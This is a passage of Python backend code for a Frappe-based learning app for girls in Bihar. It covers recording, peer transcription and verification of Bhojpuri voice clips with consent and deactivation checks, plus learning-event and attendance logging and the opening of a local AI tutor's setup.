        if frappe.db.get_value("Dialect Capture", {"client_id": client_id}, "name"):
            return {"ok": True, "dedup": True}
    if not audio_bytes or len(audio_bytes) > _CAPTURE_AUDIO_MAX:
        return {"ok": False, "error": "bad_audio"}

    # Recording no longer carries a transcription (that's stage 2, done by a different
    # student). A legacy client that still posts one keeps it in the legacy field.
    transcription = _plain_text(transcription)

    # _docname, not .strip(), on these three: a whitelisted argument can arrive as a dict and
    # .strip() would raise (a 500 + an error-log entry from a public endpoint). The VALUE of
    # each is checked below or by frappe's Select validation.
    prompt_type = (_docname(prompt_type, 40) or "in_class").lower()
    if prompt_type not in _PROMPT_TYPES:
        prompt_type = "in_class"
    relation = (_docname(speaker_relation, 40) or "self").lower()
    third_party = relation != "self" or prompt_type == "elder_home"
    consent_status = _docname(consent_status, 40) or ("self_consented" if not third_party else "")
    # Someone else's voice (elder / neighbour) may not enter the corpus without a
    # recorded consent attestation — the client collects it on the pre-submit checklist.
    if third_party and consent_status in ("", "missing"):
        return {"ok": False, "error": "consent_required"}

    track = _content_key(track)                  # these three compose a Dialect Prompt name
    lesson = _content_key(lesson)                # below, so they must be scalars too — and they
    prompt_key = _content_key(prompt_key, 60)    # are stored + shown in the PA's queue
    category = _content_key(category)            # normalise BEFORE the prompt fallback (see
                                                 # below); a category is a SLUG the PA queue
                                                 # renders, not her words → formula-lead too
    # resolve the authored prompt if it still exists; a dangling key never fails the
    # write — the denormalized prompt text keeps the row meaningful after a reseed
    prompt = None
    if track and lesson and prompt_key:
        pname = f"{track}-{lesson}-{prompt_key}"             # Dialect Prompt autoname: {lesson doc}-{key}
        if frappe.db.exists("Dialect Prompt", pname):
            prompt = pname
    if prompt:
        # The authored prompt is the source of truth for ITS OWN metadata. prompt_text_hi and
        # tier describe the authored prompt, not the recording, so when the link resolves they
        # come from the row a PA wrote and the client's values are dropped: tier used to stay
        # client-authored, which let a learner file corpus metadata that contradicts the prompt
        # she recorded (tier=9 against a complexity_tier of 5), and an unset authored tier is
        # honestly 0 (unknown) rather than her number. `category` still only FILLS IN (the game
        # echoes the prompt's own category), but see the normalisation note below.
        pinfo = frappe.db.get_value("Dialect Prompt", prompt,
                                    ["prompt_text_hi", "category", "complexity_tier"],
                                    as_dict=True) or {}
        prompt_text_hi = pinfo.get("prompt_text_hi") or ""
        # `category or …` has to run AFTER the normalisation above: junk that _plain_text
        # reduces to "" is still truthy as sent, so the authored category used to be skipped
        # and the row stored '' instead of e.g. 'market_money'.
        category = category or _content_key(pinfo.get("category"))
        tier = _int(pinfo.get("complexity_tier"))
    else:
        prompt_text_hi = _plain_text(prompt_text_hi)   # free/dangling prompt: keep her words, no markup
        tier = max(0, min(9, _int(tier)))              # no authored prompt to trust: clamp hers

    speaker = _resolve_boli_speaker(student, relation=relation, age_band=speaker_age_band,
                                    gender=speaker_gender, village=village_or_block,
                                    consent_status=consent_status)
    spk = frappe.db.get_value("Boli Speaker", speaker,
                              ["age_band", "gender", "village_or_block"], as_dict=True) or {}
    try:
        doc = frappe.get_doc({
            "doctype": "Dialect Capture", "client_id": (client_id or "")[:64] or None,
            "student": student, "student_name": sinfo.get("student_name"), "cohort": sinfo.get("cohort"),
            "operator": operator if (operator and frappe.db.exists("Student", operator)) else None,
            "speaker": speaker, "speaker_relation": relation,
            "speaker_age_band": spk.get("age_band"), "speaker_gender": spk.get("gender"),
            "village_or_block": spk.get("village_or_block"),
            "track": track, "lesson": lesson,
            "prompt_key": prompt_key, "prompt": prompt,
            "prompt_text_hi": (prompt_text_hi or "")[:500],
            "prompt_type": prompt_type, "category": category, "tier": tier,   # settled above
            "dialect_transcription": transcription[:2000] or None,
            "consent_status": consent_status or "self_consented",
            "public_ok": 1 if _int(public_ok) else 0,
            "status": "recorded",
            "duration_secs": max(0, min(600, _int(duration_secs))),   # the client stops at 3 min
            "sample_rate": max(0, _int(sample_rate)), "device_id": _plain_text(device_id)[:64],
            "captured_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:                       # raced with a retry of the same client_id
        frappe.db.rollback()
        return {"ok": True, "dedup": True}
    ext = _CAPTURE_EXT.get((mimetype or "").split(";")[0].strip().lower(), ".bin")
    file_doc = frappe.get_doc({
        "doctype": "File", "attached_to_doctype": "Dialect Capture",
        "attached_to_name": doc.name, "is_private": 1,
        "file_name": f"{doc.name}{ext}", "content": audio_bytes,
    }).insert(ignore_permissions=True)
    _unshare_capture_bytes(file_doc, f"{doc.name}{ext}", audio_bytes)   # erasability, see helper
    doc.db_set("audio_file", file_doc.file_url, update_modified=False)
    frappe.db.commit()
    # Recording pays a little now; the big XP lands when the clip is verified.
    cfg = _boli_cfg()
    _award_xp(student, "recorded", cfg["xp_recorded"], clip=doc.name,
              dedup_key="recorded:" + doc.name, student_name=sinfo.get("student_name"))
    if operator and operator != student and frappe.db.exists("Student", operator):
        _award_xp(operator, "operator_assist", cfg["xp_operator_assist"], clip=doc.name,
                  dedup_key="operator:" + doc.name)
    return {"ok": True, "id": doc.name}


# ---------------------------------------------------------------------------
# Boli stage 2 (Transcribe "लिख") + stage 3 (Verify "जांच"). These act on OTHER
# students' clips — the app's first shared, mutable, cross-student work queue.
# Connectivity is intermittent (cloud), so the client prefetches a batch and
# works offline; transcription takes a short EXCLUSIVE lease (one transcriber per
# clip, auto-released on expiry) while verification is deliberately lease-free (a
# clip needs two INDEPENDENT accepts). Server-wins: a submission against an
# already-resolved clip is kept as data but changes no outcome. All endpoints are
# allow_guest (campus students are Frappe "Guest") — real auth is _authorized().
# ---------------------------------------------------------------------------
_BOLI_QUEUE_KINDS = ("transcribe", "verify")
_VERDICTS = ("accept", "reject", "escalate")


def _owner_participating(c):
    """True when the clip's recorder still has a Student row AND that row is `active` — the
    POSITIVE form of the ownership check, and the same guard every read and write path in the
    pipeline uses (get_boli_queue's SQL `exists`, get_boli_audio, submit_transcription,
    submit_verification).

    (1) THE ROW MUST EXIST. Every other ownership test in the pipeline is
    `c.student == student`, which FAILS OPEN on a dangling owner id: nobody equals a deleted
    row, so an orphan clip looks like "somebody else's clip", i.e. like work. On the WRITE
    paths that is worse than on the read paths. Proven: submit_transcription on an orphan
    minted a transcription and flipped the clip to in_verification, then submit_verification's
    second accept raised LinkValidationError while awarding XP — AFTER _boli_mark_verified had
    already committed status='verified'. Durable result: an orphan counted in the PUBLIC corpus
    meter, every XP award rolled back, and a 500 whose traceback disclosed the erased girl's
    Student id to a learner.

    (2) SHE MUST STILL BE ACTIVE. `active` is the facilitator's one lever for offboarding and
    for withdrawn consent, and it already cuts off her own device (_token_ok). It did NOT stop
    her VOICE circulating: the queue and the audio stream checked only that her row existed,
    so a girl who had been deactivated — the exact case of "her guardian withdrew consent
    yesterday" — kept having her recordings handed to and played by classmates. Deactivation
    now behaves like a PAUSE on her data, in both directions.

    Deliberately a gate at read/serve time and NOT a status rewrite: a clip of hers sitting in
    `in_verification` is left exactly where it is, simply never offered or streamed while she
    is inactive, and it resumes untouched if she is reactivated (a mis-click, a girl who
    returns next term). Rewriting statuses on deactivation would throw away the pipeline
    position, strand her peers' half-finished work, and would need a doc hook to be reliable —
    all to achieve nothing the gate does not already achieve. PERMANENT withdrawal is a
    different operation: delete_student erases the bytes (see _erase_boli_data).

    So the pipeline is safe BY CONSTRUCTION and does not depend on an erasure having completed
    or on a background job having run. `not_found` (not a new code) is the honest answer to
    both cases: the clip is not work for anyone. Orphans are separately repaired by patch v9 /
    _erase_boli_data."""
    return bool(c.student and frappe.db.get_value("Student", c.student, "active"))


def _boli_latest_transcription(clip):
    """The most recent transcription for a clip (name/text/author/version), or None."""
    clip = _docname(clip)                        # a dict here would widen the filter
    if not clip:
        return None
    rows = frappe.get_all("Boli Transcription", filters={"clip": clip},
                          fields=["name", "text", "author", "version"],
                          order_by="version desc", limit=1)
    return rows[0] if rows else None


@frappe.whitelist(allow_guest=True)
def get_boli_queue(student=None, token=None, kind=None, batch=None):
    """Hand a student a batch of clips to work on for `kind` (transcribe|verify) — never
    her own recording/transcription, never a clip she has already handled at this stage.
    Transcribe items are leased to her (exclusive, TTL from config); verify items are
    not (independent votes). The client caches these + their audio for offline work."""
    kind = (kind or "").strip().lower()
    if kind not in _BOLI_QUEUE_KINDS:
        return {"ok": False, "error": "bad_kind"}
    student = _docname(student)                  # never a dict: it is an SQL bind + a Link write
    if not student:
        student = _session_student()
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):
        return {"ok": False, "error": "auth"}
    cfg = _boli_cfg()
    n = max(1, min(20, _int(batch) or cfg["queue_batch"]))
    now = frappe.utils.now()
    items = []
    if kind == "transcribe":
        rows = frappe.db.sql("""
            select dc.name, dc.prompt_text_hi, dc.prompt_type, dc.duration_secs
            from `tabDialect Capture` dc
            where dc.status = 'recorded' and dc.student != %(me)s
              -- The recorder must still be a PARTICIPATING student: her row must exist and
              -- be `active`. `dc.student != me` passes for a dangling owner id, so without
              -- the `exists` a clip left behind by a failed or partial erasure would go on
              -- being handed to her classmates; and without `s.active` a girl who was
              -- DEACTIVATED (offboarded, consent withdrawn) would keep having her voice
              -- handed out. SQL twin of _owner_participating() — keep the two in step.
              and exists (select 1 from `tabStudent` s
                          where s.name = dc.student and s.active = 1)
              and (dc.claim_expires is null or dc.claim_expires < %(now)s)
              and dc.audio_file is not null and dc.audio_file != ''
              and not exists (select 1 from `tabBoli Transcription` bt
                              where bt.clip = dc.name and bt.author = %(me)s)
            order by dc.captured_on asc limit %(n)s
        """, {"me": student, "now": now, "n": n}, as_dict=True)
        expires = frappe.utils.add_to_date(now, seconds=cfg["lease_ttl_secs"])
        for r in rows:
            frappe.db.set_value("Dialect Capture", r.name,
                                {"claimed_by": student, "claim_expires": expires},
                                update_modified=False)
            items.append({"clip": r.name, "prompt_text_hi": r.prompt_text_hi,
                          "prompt_type": r.prompt_type, "duration_secs": r.duration_secs,
                          "lease_expires": str(expires)})
        frappe.db.commit()
    else:  # verify — no lease; a clip wants several independent judges
        rows = frappe.db.sql("""
            select dc.name, dc.prompt_text_hi, dc.prompt_type, dc.duration_secs
            from `tabDialect Capture` dc
            where dc.status = 'in_verification' and dc.student != %(me)s
              and exists (select 1 from `tabStudent` s
                          where s.name = dc.student and s.active = 1)   -- see above
              and dc.audio_file is not null and dc.audio_file != ''
              and not exists (select 1 from `tabBoli Transcription` bt
                              where bt.clip = dc.name and bt.author = %(me)s)
              and not exists (select 1 from `tabBoli Verification` bv
                              where bv.clip = dc.name and bv.verifier = %(me)s)
            order by dc.captured_on asc limit %(n)s
        """, {"me": student, "n": n}, as_dict=True)
        for r in rows:
            tr = _boli_latest_transcription(r.name)
            if not tr:
                continue
            items.append({"clip": r.name, "prompt_text_hi": r.prompt_text_hi,
                          "prompt_type": r.prompt_type, "duration_secs": r.duration_secs,
                          "transcription": {"id": tr["name"], "text": tr["text"]}})
    return {"ok": True, "kind": kind, "items": items}


@frappe.whitelist(allow_guest=True)
def get_boli_audio(student=None, token=None, clip=None):
    """Stream one clip's PRIVATE audio to an authorized student for transcribe/verify.
    Campus students aren't Frappe users, so /private/files can't serve them — access is
    gated on the bearer token + the work context (never her own clip; a recorded clip
    must be leased to her). The client fetch()es this into an offline blob."""
    student, clip = _docname(student), _docname(clip)   # a dict `clip` would be an ORM FILTER
    if not clip:                                       # (see _docname) — reject, don't resolve
        return {"ok": False, "error": "not_found"}
    if not student:
        student = _session_student()
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):
        return {"ok": False, "error": "auth"}
    c = frappe.db.get_value("Dialect Capture", clip,
                            ["name", "student", "status", "claimed_by", "audio_file"], as_dict=True)
    if not c or not c.audio_file:
        return {"ok": False, "error": "not_found"}
    # Never stream a clip whose owner is gone OR deactivated: `c.student == student` FAILS
    # OPEN on a dangling owner id, so an orphan used to be served to peers, and a deactivated
    # girl's voice kept playing on her classmates' laptops. ONE definition of the positive
    # check, shared with the two write paths — see _owner_participating for the full why.
    if not _owner_participating(c):
        return {"ok": False, "error": "not_found"}
    if c.student == student:
        return {"ok": False, "error": "own_clip"}
    allowed = (c.status == "in_verification") or (c.status == "recorded" and c.claimed_by == student)
    if not allowed:
        return {"ok": False, "error": "not_available"}
    fname = frappe.db.get_value("File", {"file_url": c.audio_file, "attached_to_name": c.name}, "name")
    if not fname:
        return {"ok": False, "error": "not_found"}
    fdoc = frappe.get_doc("File", fname)
    frappe.local.response.filename = fdoc.file_name
    frappe.local.response.filecontent = fdoc.get_content()
    frappe.local.response.type = "download"


@frappe.whitelist(allow_guest=True)
def submit_transcription(student=None, token=None, clip=None, text=None,
                         lint_warnings=None, client_id=None):
    """Stage 2 — a student types the Devanagari transcription of someone else's clip.
    Moves the clip to in_verification and releases the transcribe lease. No XP here; the
    reward lands when two peers verify it (see submit_verification)."""
    if not _rate_ok("boli-tx:" + _client_ip(), 1200, 3600):
        return {"ok": False, "error": "rate_limited"}
    student, clip = _docname(student), _docname(clip)   # scalars only (see _docname)
    client_id = _docname(client_id, 64)                # a LIST here is an ORM operator spec
    if not clip:                                       # ("like", "%") → someone else's row
        return {"ok": False, "error": "not_found"}
    if not student:
        student = _session_student()
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):
        return {"ok": False, "error": "auth"}
    if client_id:
        existing = frappe.db.get_value("Boli Transcription", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}
    text = _plain_text(text)          # her Devanagari survives; markup never reaches the PA queue
    # lint_warnings is a CLIENT-authored diagnostic string, stored verbatim until now. It does
    # not reach a grid today, but it sits one "add a column" away from the adjudication report,
    # so it gets the same treatment as the transcription itself rather than being trusted.
    lint_warnings = _plain_text(lint_warnings)[:500]
    if not text:
        return {"ok": False, "error": "bad_transcription"}
    c = frappe.db.get_value("Dialect Capture", clip, ["name", "student", "status"], as_dict=True)
    if not c:
        return {"ok": False, "error": "not_found"}
    if not _owner_participating(c):
        return {"ok": False, "error": "not_found"}
    if c.student == student:
        return {"ok": False, "error": "own_clip"}            # can't transcribe your own recording
    if c.status != "recorded":
        return {"ok": False, "error": "not_available"}       # already transcribed / verified / resolved
    ver = _int(frappe.db.sql(
        "select coalesce(max(version), 0) from `tabBoli Transcription` where clip=%s", clip)[0][0]) + 1
    try:
        doc = frappe.get_doc({
            "doctype": "Boli Transcription", "client_id": (client_id or "")[:64] or None,
            "clip": clip, "author": student, "text": text[:2000], "version": ver,
            "lint_warnings": lint_warnings, "is_final": 0,          # normalised above
            "submitted_at": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:
        frappe.db.rollback()
        existing = frappe.db.get_value("Boli Transcription", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.set_value("Dialect Capture", clip,
                        {"status": "in_verification", "claimed_by": None, "claim_expires": None},
                        update_modified=False)
    frappe.db.commit()
    return {"ok": True, "name": doc.name, "version": ver}


@frappe.whitelist(allow_guest=True)
def submit_verification(student=None, token=None, clip=None, transcription=None,
                        verdict=None, reason=None, client_id=None):
    """Stage 3 — a peer judges the latest transcription: accept / reject(+reason) /
    escalate. accepts_to_verify independent accepts VERIFY the clip (transcriber, speaker
    and matching verifiers paid); a reject sends it back to be re-transcribed (capped at
    max_rework_rounds, then it parks for PA); an escalate parks it for PA. The outcome and
    all XP are decided SERVER-side, never trusted from the client."""
    if not _rate_ok("boli-vf:" + _client_ip(), 3000, 3600):
        return {"ok": False, "error": "rate_limited"}
    verdict = _docname(verdict, 20).lower()      # a dict/list is simply not a verdict
    if verdict not in _VERDICTS:
        return {"ok": False, "error": "bad_verdict"}
    # `reason` is a Select, so frappe validates the VALUE on insert; this only guarantees a
    # scalar string reaches it (a dict used to raise a TypeError on the slice → HTTP 500).
    reason = _plain_text(reason)[:40]
    # scalars only (see _docname). `transcription` is coerced even though the verdict is
    # currently re-resolved server-side from the clip, so it can never become a filter if a
    # later change starts honouring the client's id.
    student, clip = _docname(student), _docname(clip)
    transcription, client_id = _docname(transcription), _docname(client_id, 64)
    if not clip:
        return {"ok": False, "error": "not_found"}
    if not student:
        student = _session_student()
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):
        return {"ok": False, "error": "auth"}
    if client_id:
        existing = frappe.db.get_value("Boli Verification", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}
    c = frappe.db.get_value("Dialect Capture", clip,
                            ["name", "student", "status", "rework_rounds",
                             "prompt_type", "speaker", "speaker_relation"], as_dict=True)
    if not c:
        return {"ok": False, "error": "not_found"}
    if not _owner_participating(c):
        return {"ok": False, "error": "not_found"}
    if c.student == student:
        return {"ok": False, "error": "own_clip"}
    tr = _boli_latest_transcription(clip)
    if not tr:
        return {"ok": False, "error": "not_available"}
    if tr["author"] == student:
        return {"ok": False, "error": "own_transcription"}   # can't verify what you wrote
    if frappe.db.exists("Boli Verification",
                        {"clip": clip, "transcription": tr["name"], "verifier": student}):
        return {"ok": True, "dedup": True}                   # one vote per transcription
    # server-wins: if the clip already left verification, keep the vote as data (audit /
    # future accuracy) but don't disturb the settled outcome
    stale = c.status != "in_verification"
    try:
        vdoc = frappe.get_doc({
            "doctype": "Boli Verification", "client_id": (client_id or "")[:64] or None,
            "clip": clip, "transcription": tr["name"], "verifier": student,
            "verdict": verdict, "reason": reason if verdict == "reject" else "",
            "is_gold_check": 0, "created_at": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:
        frappe.db.rollback()
        existing = frappe.db.get_value("Boli Verification", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.commit()
    if stale:
        return {"ok": True, "name": vdoc.name, "stale": True}

    cfg = _boli_cfg()
    result = {"ok": True, "name": vdoc.name}
    if verdict == "accept":
        accepts = _int(frappe.db.sql(
            "select count(distinct verifier) from `tabBoli Verification` "
            "where clip=%s and transcription=%s and verdict='accept'", (clip, tr["name"]))[0][0])
        if accepts >= cfg["accepts_to_verify"]:
            _boli_mark_verified(c, tr, cfg)
            result["verified"] = True
    elif verdict == "reject" and _int(c.rework_rounds) < cfg["max_rework_rounds"]:
        # rework: re-open for transcription (a fresh transcriber redoes it; returning it
        # to the SAME transcriber's personal inbox is a Phase-2 refinement)
        frappe.db.set_value("Dialect Capture", clip,
                            {"status": "recorded", "rework_rounds": _int(c.rework_rounds) + 1,
                             "claimed_by": None, "claim_expires": None}, update_modified=False)
        frappe.db.commit()
        result["rework"] = True
    else:  # escalate, or a reject once rework is exhausted → forced PA adjudication
        frappe.db.set_value("Dialect Capture", clip, {"status": "escalated"}, update_modified=False)
        frappe.db.commit()
        result["escalated"] = True
    return result


def _boli_mark_verified(c, tr, cfg):
    """Transition a clip to verified and pay the pipeline: the transcriber earns
    xp_transcription_verified, each matching (accepting) verifier earns xp_verification_match,
    the speaker earns a credit when she is a learner, and an elder recording pays the
    recorder the elder bonus. Every award is idempotent via a per-clip dedup_key so a
    double-trip never double-pays."""
    frappe.db.set_value("Dialect Capture", c.name, {"status": "verified"}, update_modified=False)
    frappe.db.set_value("Boli Transcription", tr["name"], {"is_final": 1}, update_modified=False)
    frappe.db.commit()
    _award_xp(tr["author"], "transcription_verified", cfg["xp_transcription_verified"],
              clip=c.name, dedup_key="verified:" + c.name)
    for v in frappe.get_all("Boli Verification",
                            filters={"clip": c.name, "transcription": tr["name"], "verdict": "accept"},
                            pluck="verifier"):
        _award_xp(v, "verification_match", cfg["xp_verification_match"],
                  clip=c.name, dedup_key="vmatch:%s:%s" % (c.name, v))
    spk_student = frappe.db.get_value("Boli Speaker", c.speaker, "student") if c.speaker else None
    if spk_student:
        _award_xp(spk_student, "speaker_credit", cfg["xp_speaker_credit"],
                  clip=c.name, dedup_key="speaker:" + c.name)
    if (c.speaker_relation or "") == "family-elder" or (c.prompt_type or "") == "elder_home":
        _award_xp(c.student, "elder_verified", cfg["xp_elder_verified"],
                  clip=c.name, dedup_key="elder:" + c.name)


@frappe.whitelist(allow_guest=True)
def boli_home(student=None, token=None):
    """Powers the भोजपुरी AI / Bhojpuri AI tab: the shared Corpus Meter (always) plus, when
    authed, this student's own contribution counts + gems. The meter is the class's single
    shared motivator — cooperation over competition."""
    m = frappe.db.sql("""
        select count(*) as clips, coalesce(sum(duration_secs), 0) as secs
        from `tabDialect Capture` where status in ('verified', 'curated', 'exported')
    """, as_dict=True)[0]
    out = {"ok": True, "meter": {"verifiedClips": _int(m.clips),
                                 "verifiedMinutes": round(_int(m.secs) / 60)}}
    student = _docname(student)                  # scalars only (see _docname)
    if not student:
        student = _session_student()
    if student and _authorized(student, token):
        out["mine"] = {
            "recorded": _int(frappe.db.count("Dialect Capture", {"student": student})),
            "transcribed": _int(frappe.db.count("Boli Transcription", {"author": student})),
            "verified": _int(frappe.db.count("Boli Verification", {"verifier": student})),
            "gems": _total_gems(student),
        }
    return out


@frappe.whitelist(allow_guest=True)
def log_event(student=None, token=None, kind=None, track=None, lesson=None, activity=None,
              question=None, chosen=None, answer=None, lang=None, client_id=None,
              tool=None, duration_secs=None, count=None):
    """Record one fine-grained learning event. Mirrors report_doubt: idempotent on
    client_id, offline-queue friendly, guests allowed (anonymous data still tells the
    teacher which QUESTION or ACTIVITY is broken). No notification — this is a
    high-volume analytics stream, not an alert. Kinds:
      wrong_answer — the exact question a learner missed and what she picked instead
      dwell        — time spent on an activity she LEFT without finishing (finished
                     time rides on Lesson Attempt.duration_secs); duration_secs
      tool_use     — batched taps of a UI tool (listen / lang_switch / replay …);
                     tool + count, aggregated client-side per activity
      test_exit    — a module test was voided by the anti-cheat guard; tool carries
                     the reason (hidden/blur/fullscreen_exit/pagehide/stopped),
                     duration_secs = seconds into the test, count = question reached"""
    if not _rate_ok("event:" + _client_ip(), 6000, 3600):   # wrong answers come in bursts; keep the ceiling high
        return {"ok": False, "error": "rate_limited"}
    if kind not in ("wrong_answer", "dwell", "tool_use", "test_exit"):
        return {"ok": False, "error": "bad_kind"}
    student, client_id = _docname(student), _docname(client_id, 64)   # scalars only (see _docname)
    # EVERY string on this row is learner-authored and every one of them is a column in the
    # facilitator's "Wrong Answers" / "Student Engagement" reports — question/chosen/answer are
    # literally the text of a quiz option she typed or tapped. Normalise them all.
    track, lesson, activity = _content_key(track), _content_key(lesson), _content_key(activity)
    tool, lang = _content_key(tool, 40), _content_key(lang, 10)
    question, chosen, answer = (_plain_text(question)[:140], _plain_text(chosen)[:140],
                                _plain_text(answer)[:140])
    duration_secs = max(0, min(7200, _int(duration_secs)))  # same 2h sanity cap as attempts
    count = max(1, min(1000, _int(count) or 1))
    if kind == "dwell" and duration_secs <= 0:
        return {"ok": False, "error": "bad_duration"}
    if kind == "tool_use" and not tool:
        return {"ok": False, "error": "bad_tool"}
    if client_id:
        existing = frappe.db.get_value("Learning Event", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}

    sname, cohort = None, None
    if not student:
        student = _session_student()
    if student:
        sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
        if not sinfo or not sinfo.active:
            return {"ok": False, "error": "unknown_student"}
        if not _authorized(student, token):
            return {"ok": False, "error": "auth"}
        sname, cohort = sinfo.get("student_name"), sinfo.get("cohort")

    try:
        doc = frappe.get_doc({
            "doctype": "Learning Event", "client_id": client_id or None,
            "student": student or None, "student_name": sname, "cohort": cohort,
            "kind": kind,
            "track": track, "lesson": lesson, "activity": activity,   # normalised above
            "tool": tool,
            "duration_secs": duration_secs, "count": count,
            "question": question, "chosen": chosen, "answer": answer,
            "lang": lang,
            "occurred_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:
        frappe.db.rollback()
        existing = frappe.db.get_value("Learning Event", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.commit()
    return {"ok": True, "name": doc.name}


# ---------------------------------------------------------------------------
# Attendance — the game banks a logged-in student's ACTIVE screen time on-device
# and flushes it here in small deltas (offline-queued, idempotent). Two tiers:
# Attendance Ping is the raw audit log (client_id-deduped), Attendance Day is the
# per-(student, local-date) aggregate the facilitator reports read. Facilitator
# report only — nothing about attendance is ever shown to students.
# ---------------------------------------------------------------------------
_ATT_PING_MAX_SECS = 900        # one ping can never claim more than 15 minutes
_ATT_PAST_WINDOW_DAYS = 30      # matches the client's day store — a campus laptop
                                # that stays offline for weeks must not lose real
                                # attendance when it finally syncs
_ATT_FUTURE_WINDOW_DAYS = 1     # tolerate a device clock slightly ahead


@frappe.whitelist(allow_guest=True)
def log_attendance(student=None, token=None, date=None, secs=0, client_id=None, device_id=None):
    """Record one active-time delta. The client's LOCAL date is the day-of-record
    (campus devices are offline; server date would misfile late-night syncs), and
    received_on keeps the server-side audit anchor. The 900s per-ping cap means
    forging a Present day (>=150 min) takes 10+ pings with unique client_ids —
    visible in the audit trail — rather than one big number."""
    if not _rate_ok("att:" + _client_ip(), 2000, 3600):     # a 30-laptop room ≈ 360/hr
        return {"ok": False, "error": "rate_limited"}
    student, client_id = _docname(student), _docname(client_id, 64)   # scalars only (see _docname)
    device_id = _content_key(device_id, 60)   # client-authored IDENTIFIER; the attendance
                                              # report renders + exports it (formula lead out)
    if not student:
        student = _session_student()
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if client_id:
        existing = frappe.db.get_value("Attendance Ping", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "dedup": True}
    sinfo = frappe.db.get_value("Student", student,
                                ["student_name", "cohort", "campus", "active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):
        return {"ok": False, "error": "auth"}

    try:
        d = frappe.utils.getdate(date)
    except Exception:
        return {"ok": False, "error": "bad_date"}
    today = frappe.utils.getdate()
    if (today - d).days > _ATT_PAST_WINDOW_DAYS or (d - today).days > _ATT_FUTURE_WINDOW_DAYS:
        return {"ok": False, "error": "date_out_of_range"}
    secs = max(0, min(_ATT_PING_MAX_SECS, _int(secs)))
    if secs <= 0:
        return {"ok": False, "error": "bad_secs"}

    # Upsert the Day aggregate FIRST, then insert the Ping. If the ping insert races
    # a duplicate client_id, the rollback undoes the day increment too — so the
    # dedup ledger (pings) and the aggregate can never drift apart. (Inserting the
    # ping first would let a raced Day insert roll the ping away while keeping the
    # seconds — the classic double-count on retry.)
    min_minutes = _int(frappe.db.get_single_value("Hikmat Settings", "attendance_min_minutes")) or 150
    now = frappe.utils.now()
    for _attempt in range(2):
        day_name = frappe.db.get_value("Attendance Day", {"student": student, "date": d}, "name")
        try:
            if day_name:
                frappe.db.sql(
                    """update `tabAttendance Day`
                       set active_secs = active_secs + %s, last_ping = %s,
                           present = (active_secs >= %s)
                       where name = %s""",
                    (secs, now, min_minutes * 60, day_name))
            else:
                frappe.get_doc({
                    "doctype": "Attendance Day", "student": student,
                    "student_name": sinfo.get("student_name"), "cohort": sinfo.get("cohort"),
                    "campus": sinfo.get("campus"), "date": d,
                    "active_secs": secs, "present": 1 if secs >= min_minutes * 60 else 0,
                    "device_count": 1, "first_ping": now, "last_ping": now,
                }).insert(ignore_permissions=True)
            frappe.get_doc({
                "doctype": "Attendance Ping", "client_id": client_id or None,
                "student": student, "student_name": sinfo.get("student_name"),
                "date": d, "secs": secs, "device_id": device_id,   # normalised above
                "received_on": now,
            }).insert(ignore_permissions=True)
            break
        except frappe.DuplicateEntryError:
            frappe.db.rollback()
            # Either the same client_id landed twice (→ dedup, done) or two devices
            # raced the first Day insert (→ retry once; the update path now wins).
            if client_id and frappe.db.get_value("Attendance Ping", {"client_id": client_id}, "name"):
                return {"ok": True, "dedup": True}
    else:
        return {"ok": False, "error": "conflict"}

    # device_count from the audit trail (cheap: one day's pings for one student)
    total, devices = frappe.db.sql(
        """select coalesce(sum(secs), 0), count(distinct device_id)
           from `tabAttendance Ping` where student=%s and date=%s""", (student, d))[0]
    frappe.db.sql("update `tabAttendance Day` set device_count=%s where student=%s and date=%s",
                  (max(1, _int(devices)), student, d))
    frappe.db.commit()
    return {"ok": True, "secs_today": _int(total), "present": _int(total) >= min_minutes * 60}


def prune_attendance_pings():
    """Daily housekeeping (hooks.py scheduler): raw pings older than 90 days are only
    needed for client_id dedup and short-term audit — the client's own queue/day-store
    horizon is 30 days, so a 90-day retention can never re-admit a replayed ping."""
    try:
        frappe.db.sql("delete from `tabAttendance Ping` where received_on < %s",
                      frappe.utils.add_days(frappe.utils.now(), -90))
        frappe.db.commit()
    except Exception:
        frappe.log_error(frappe.get_traceback(), "prune_attendance_pings")


# ---------------------------------------------------------------------------
# "Roshni AI" — the local-Ollama voice/text tutor. The game posts a child's typed
# (later: spoken→transcribed) doubt here; we forward it to a LOCAL Ollama model on
# this machine and speak the Hindi reply back. This is the ONLY place that talks to
# the model, so safety, logging, and the system prompt all live server-side where
# client JS can't bypass them. The feature is purely ADDITIVE: if anything here fails
# the game falls back to the always-present scripted "Roshni" help. See SECURITY.md.
#
# Defence-in-depth (MVP floor): fail-CLOSED rate limit → require a consented, logged-in
# student → PII-redact before persisting → deterministic crisis short-circuit (never
# calls the model) → bounded Ollama call → output filter → log every turn for the
# facilitator review queue. A guard model + real-time crisis escalation come next.
# ---------------------------------------------------------------------------

# Fallback system prompt if Hikmat Settings has none (the editable copy lives in the
# Single so a facilitator can tune Roshni's voice without a code change).
_DEFAULT_AI_PROMPT = (
    'तुम "रोशनी" हो — चंपारण, बिहार की छोटी बच्चियों की एक प्यारी, मददगार टीचर-दीदी। '
    "एकदम आसान, रोज़मर्रा की हिंदी में बात करो (आम अंग्रेज़ी शब्द चल जाते हैं); कठिन या "
